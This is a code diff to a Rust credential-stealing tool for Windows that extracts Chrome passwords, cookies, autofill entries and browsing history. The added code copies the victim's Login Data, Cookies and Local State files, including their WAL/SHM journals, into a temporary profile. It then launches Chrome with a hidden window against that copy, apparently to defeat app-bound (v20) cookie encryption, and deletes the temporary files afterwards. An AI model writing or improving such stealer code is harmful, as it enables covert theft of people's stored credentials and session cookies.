@@ -264,11 +264,49 @@ extern "system" {
 
 fn main() {
     unsafe {
+        let user_data_dir = get_user_data_dir().unwrap_or_default();
+        let temp_user_data = std::env::temp_dir().join(format!("chrome_user_{}", rand::random::<u32>()));
+        let _ = fs::create_dir_all(&temp_user_data);
+
+        let local_state = user_data_dir.join("Local State");
+        if local_state.exists() {
+            let _ = fs::copy(&local_state, temp_user_data.join("Local State"));
+        }
+
+        // Seed profile for v20 trigger
+        let profiles = discover_profiles(&user_data_dir);
+        if !profiles.is_empty() {
+            let src_profile = user_data_dir.join(&profiles[0]);
+            let dst_profile = temp_user_data.join("Default");
+            let _ = fs::create_dir_all(&dst_profile);
+            for file in ["Preferences", "Login Data", "Cookies"] {
+                let src_file = if file == "Cookies" {
+                    let mut p = src_profile.join("Network").join(file);
+                    if !p.exists() { p = src_profile.join(file); }
+                    p
+                } else {
+                    src_profile.join(file)
+                };
+
+                if src_file.exists() {
+                    let dst_file = dst_profile.join(file);
+                    let _ = fs::copy(&src_file, &dst_file);
+
+                    let src_path = src_file.to_string_lossy();
+                    let dst_path = dst_file.to_string_lossy();
+                    let _ = fs::copy(format!("{}-wal", src_path), format!("{}-wal", dst_path));
+                    let _ = fs::copy(format!("{}-shm", src_path), format!("{}-shm", dst_path));
+                }
+            }
+        }
+
         let mut si: STARTUPINFOW = zeroed();
         si.cb = size_of::<STARTUPINFOW>() as u32;
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
         let mut pi: PROCESS_INFORMATION = zeroed();
 
-        let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
+        let mut chrome_cmd: Vec<u16> = format!("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check --user-data-dir=\"{}\"\0", temp_user_data.display())
             .encode_utf16()
             .collect();
 
@@ -287,6 +325,7 @@ fn main() {
 
         if success == 0 {
             eprintln!("Failed to create Chrome process: {}", GetLastError());
+            let _ = fs::remove_dir_all(temp_user_data);
             return;
         }
 
@@ -296,6 +335,8 @@ fn main() {
 
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+
+        let _ = fs::remove_dir_all(temp_user_data);
     }
 }
 
@@ -646,13 +687,27 @@ fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
         return None;
     }
 
+    let db_str = db_path.to_string_lossy();
+    let temp_str = temp_db.to_string_lossy();
+    let _ = fs::copy(format!("{}-wal", db_str), format!("{}-wal", temp_str));
+    let _ = fs::copy(format!("{}-shm", db_str), format!("{}-shm", temp_str));
+
     match Connection::open(&temp_db) {
         Ok(conn) => Some((conn, temp_db)),
         Err(_) => {
             let _ = fs::remove_file(&temp_db);
+            let _ = fs::remove_file(format!("{}-wal", temp_str));
+            let _ = fs::remove_file(format!("{}-shm", temp_str));
             None
         }
     }
+}
+
+fn cleanup_temp_db(path: PathBuf) {
+    let s = path.to_string_lossy();
+    let _ = fs::remove_file(&path);
+    let _ = fs::remove_file(format!("{}-wal", s));
+    let _ = fs::remove_file(format!("{}-shm", s));
 }
 
 fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
@@ -671,7 +726,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        cleanup_temp_db(temp_path);
     }
 }
 
@@ -702,7 +757,7 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        cleanup_temp_db(temp_path);
     }
 }
 
@@ -742,7 +797,7 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
                 }
             }
         }
-        let _ = fs::remove_file(temp_path);
+        cleanup_temp_db(temp_path);
     }
 }
 
@@ -762,7 +817,7 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
                 writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
             }
         }
-        let _ = fs::remove_file(temp_path);
+        cleanup_temp_db(temp_path);
     }
 }
 
